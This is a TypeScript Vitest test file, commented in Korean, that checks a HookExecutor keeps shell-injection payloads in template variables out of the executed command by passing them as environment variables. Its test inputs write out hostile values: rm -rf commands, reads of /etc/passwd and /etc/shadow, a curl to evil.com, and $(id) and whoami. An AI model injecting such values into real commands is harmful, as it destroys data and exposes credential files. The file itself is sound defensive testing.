import { describe, it, expect, vi, beforeEach } from "vitest";
import { HookExecutor } from "../../src/hooks/hook-executor.js";
import type { HookDefinition } from "../../src/types/hooks.js";

// exec mock은 모듈 레벨에서 캡처
let capturedCommand = "";
let capturedEnv: Record<string, string> | undefined;

vi.mock("child_process", () => ({
  exec: vi.fn(),
}));

vi.mock("util", () => ({
  promisify: vi.fn(() => {
    return vi.fn().mockImplementation(
      async (cmd: string, opts: { env?: Record<string, string> }) => {
        capturedCommand = cmd;
        capturedEnv = opts?.env as Record<string, string> | undefined;
        // exec callback 시뮬레이션
        return { stdout: "ok", stderr: "" };
      }
    );
  }),
}));

vi.mock("../../src/utils/logger.js", () => ({
  getLogger: () => ({
    debug: vi.fn(),
    info: vi.fn(),
    warn: vi.fn(),
    error: vi.fn(),
  }),
}));

describe("HookExecutor — Shell Injection 방어", () => {
  beforeEach(() => {
    capturedCommand = "";
    capturedEnv = undefined;
    vi.clearAllMocks();
  });

  function makeHook(command: string): HookDefinition {
    return { command, timeout: 5000 };
  }

  it("변수 값이 환경변수로 분리되고 명령에는 참조만 삽입된다", async () => {
    const executor = new HookExecutor({ issue_title: "Fix bug" });
    await executor.executeHook(makeHook('echo {{issue_title}}'));

    // 명령에 실제 값이 직접 포함되지 않음
    expect(capturedCommand).not.toContain("Fix bug");
    // 환경변수 참조 형태로 치환됨
    expect(capturedCommand).toContain("$HOOK_ISSUE_TITLE");
    // 실제 값은 env로 분리됨
    expect(capturedEnv?.["HOOK_ISSUE_TITLE"]).toBe("Fix bug");
  });

  it("$(command) 형태 주입 시 셸에서 실행되지 않는다", async () => {
    const maliciousTitle = "$(rm -rf /tmp/test)";
    const executor = new HookExecutor({ title: maliciousTitle });
    await executor.executeHook(makeHook('notify {{title}}'));

    // 악성 페이로드가 명령에 직접 삽입되지 않음
    expect(capturedCommand).not.toContain("$(rm -rf");
    // 환경변수에만 안전하게 보관됨
    expect(capturedEnv?.["HOOK_TITLE"]).toBe(maliciousTitle);
  });

  it("백틱(`) 주입 시 명령에 직접 노출되지 않는다", async () => {
    const maliciousTitle = "`cat /etc/passwd`";
    const executor = new HookExecutor({ title: maliciousTitle });
    await executor.executeHook(makeHook('log {{title}}'));

    expect(capturedCommand).not.toContain("`cat /etc/passwd`");
    expect(capturedEnv?.["HOOK_TITLE"]).toBe(maliciousTitle);
  });

  it("파이프(|) 포함 값 주입 시 명령에 직접 노출되지 않는다", async () => {
    const malicious = "safe | rm -rf /";
    const executor = new HookExecutor({ branch: malicious });
    await executor.executeHook(makeHook('git checkout {{branch}}'));

    expect(capturedCommand).not.toContain("| rm -rf /");
    expect(capturedEnv?.["HOOK_BRANCH"]).toBe(malicious);
  });

  it("세미콜론(;) 연결 명령 주입 시 차단된다", async () => {
    const malicious = "main; cat /etc/shadow";
    const executor = new HookExecutor({ branch: malicious });
    await executor.executeHook(makeHook('git checkout {{branch}}'));

    expect(capturedCommand).not.toContain("; cat /etc/shadow");
    expect(capturedEnv?.["HOOK_BRANCH"]).toBe(malicious);
  });

  it("앰퍼샌드(&) 백그라운드 실행 주입 시 차단된다", async () => {
    const malicious = "main & curl evil.com";
    const executor = new HookExecutor({ branch: malicious });
    await executor.executeHook(makeHook('git push origin {{branch}}'));

    expect(capturedCommand).not.toContain("& curl evil.com");
    expect(capturedEnv?.["HOOK_BRANCH"]).toBe(malicious);
  });

  it("$() 달러 변수 확장 주입 시 차단된다", async () => {
    const malicious = "${IFS}rm${IFS}-rf${IFS}/";
    const executor = new HookExecutor({ label: malicious });
    await executor.executeHook(makeHook('echo {{label}}'));

    expect(capturedCommand).not.toContain("${IFS}");
    expect(capturedEnv?.["HOOK_LABEL"]).toBe(malicious);
  });

  it("여러 변수에 주입 시도해도 모두 환경변수로 분리된다", async () => {
    const executor = new HookExecutor({
      title: "$(id)",
      branch: "`whoami`",
      label: "; echo pwned",
    });
    await executor.executeHook(makeHook('notify {{title}} {{branch}} {{label}}'));

    expect(capturedCommand).not.toContain("$(id)");
    expect(capturedCommand).not.toContain("`whoami`");
    expect(capturedCommand).not.toContain("; echo pwned");

    expect(capturedEnv?.["HOOK_TITLE"]).toBe("$(id)");
    expect(capturedEnv?.["HOOK_BRANCH"]).toBe("`whoami`");
    expect(capturedEnv?.["HOOK_LABEL"]).toBe("; echo pwned");
  });

  it("치환된 명령은 환경변수 참조 형태($HOOK_*) 를 사용한다", async () => {
    const executor = new HookExecutor({ issue_number: "42" });
    await executor.executeHook(makeHook('aqm run {{issue_number}}'));

    expect(capturedCommand).toMatch(/"\$HOOK_ISSUE_NUMBER"/);
  });

  it("변수 키가 중첩 경로(dots)일 때 올바른 환경변수 이름으로 변환된다", async () => {
    const executor = new HookExecutor({ "phase.name": "implement" });
    await executor.executeHook(makeHook('echo {{phase.name}}'));

    // dots → underscores, HOOK_ prefix
    expect(capturedEnv?.["HOOK_PHASE_NAME"]).toBe("implement");
  });

  it("spawn 방식(환경변수 분리) 확인: exec에 env 옵션이 전달된다", async () => {
    const executor = new HookExecutor({ key: "value" });
    await executor.executeHook(makeHook('echo {{key}}'));

    // env가 옵션으로 전달됨을 확인 (환경변수 주입 분리)
    expect(capturedEnv).toBeDefined();
    expect(typeof capturedEnv).toBe("object");
  });
});
